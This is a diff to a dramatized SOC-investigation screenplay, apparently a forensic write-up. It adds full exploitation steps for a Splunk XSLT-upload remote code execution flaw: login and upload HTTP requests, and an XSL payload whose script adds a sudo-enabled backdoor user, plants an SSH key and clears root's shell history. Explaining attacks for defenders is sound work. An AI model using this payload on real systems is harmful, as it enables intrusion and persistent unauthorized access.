@@ -91,7 +91,7 @@ _The team exchanges knowing looks. There's only one person who can unravel this 
 
 ---
 
-### Scene 8: Enter Mona
+### Scene 8: Enter **Mona**
 
 _The SOC room door hisses open. A figure stands in the doorway, silhouetted against the hallway lights. Her custom-built laptop glows with a soft, dangerous light._
 
@@ -150,14 +150,6 @@ _The screen refreshes, packets reorganizing themselves like digital playing card
 
 _Mona leans forward, her eyes narrowing at a particular sequence of packets._
 
-```
-[Packet Analysis]
-Time: 23:15:47
-Source: 192.168.1.105
-Destination: 10.0.0.15:8000
-Protocol: HTTP
-```
-
 **Mona** [to herself]:  
 "The Splunk web UI connection... something's not right here."
 
@@ -179,11 +171,30 @@ _Her voice trails off as she furiously types._
 ### Scene 6: The Revelation
 
 ```
-[CRITICAL FINDING]
-CVE ID: CVE-2023-46214
-Status: CONFIRMED
-Severity: CRITICAL
-Vector: Splunk Web UI
+POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
+Host: ubuntu:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept-Encoding: gzip, deflate, br
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Connection: keep-alive
+X-Requested-With: XMLHttpRequest
+X-Splunk-Form-Key: 7329280097253260706
+Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706; session_id_8000=df3ea150f1987e9303605bbaa9a30fae85cc6fbe
+Content-Length: 1559
+Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e
+
+
+Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
+Content-Type: application/xslt+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
+        <xsl:text>#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history</xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
 ```
 
 _The room falls silent as the implications sink in._
@@ -191,24 +202,94 @@ _The room falls silent as the implications sink in._
 **Mona** [grimly]:  
 "This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."
 
+**Thomas** [pointing at the screen]:  
+"That's exactly when my security alerts started firing!"
+
 ---
 
 ### Scene 7: The Evidence
 
 _Mona pulls up multiple windows, creating a timeline of the attack:_
 
-```
-23:15:47 - Initial connection to Splunk UI
-23:15:52 - Malformed request detected
-23:16:03 - Unusual response size
-23:16:15 - Command injection signature
-23:16:30 - File system access attempt
+#### Step 1: Login
+
+The exploitation process begins with sending a login HTTP `POST` request. The attacker requires user credentials to proceed.
+
+```bash
+POST /en-US/account/login HTTP/1.1
+Host: ubuntu:8000
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+Content-Length: 78
+Content-Type: application/x-www-form-urlencoded
+
+username=johnnyC&password=h3Re15j0hnNy&set_has_logged_in=false
 ```
 
-**Thomas** [pointing at the screen]:  
-"That's exactly when my security alerts started firing!"
+#### Step 2: Upload Malicious XSL File
 
----
+After login, the attacker uploads a malicious XSL file, the main payload for this exploit:
+
+```bash
+POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
+Host: ubuntu:8000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept-Encoding: gzip, deflate, br
+Accept: application/xml, */*
+Connection: keep-alive
+X-Splunk-Form-Key: 7329280097253260706
+Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706
+Content-Length: 1559
+Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e
+
+Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
+Content-Type: application/xslt+xml
+```
+
+#### Step 3: Malicious Code in XSL File
+
+The XSL file uploads a payload with the following commands:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
+        <xsl:text>#!/bin/bash
+adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
+access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
+echo "nginx:$access" | chpasswd
+usermod -aG sudo nginx
+mkdir /var/www/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org" > /var/www/.ssh/authorized_keys
+chown -R nginx:nginx /var/www/
+cat /dev/null > /root/.bash_history</xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+#### Explanation of the Malicious Code
+
+- **Add User**: Adds a new user named `nginx` with a home directory of `/var/www/`.
+- **Set Password**: Decodes and reverses a base64 password.
+  ```bash
+  access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
+  ```
+  **Decoded Password**: `f8287ec2-3f9a-4a39-9076-36546ebb6a93`
+- **Set SSH Access**: Adds an RSA public key to allow SSH access for the `nginx` user.
+
+#### Step 4: Trigger Code Execution
+
+Once the malicious XSL file is uploaded, the vulnerable code path is accessed using the `getJobAsset` function by calling the job search endpoint with the dispatch ID:
+
+```bash
+POST /en-US/splunkd/__raw/servicesNS/johnnyC/search/search/jobs?output_mode=json HTTP/1.1
+```
+
+This ultimately allows the attacker to execute arbitrary code and escalate privileges.
 
 ### Scene 8: The Confirmation
 
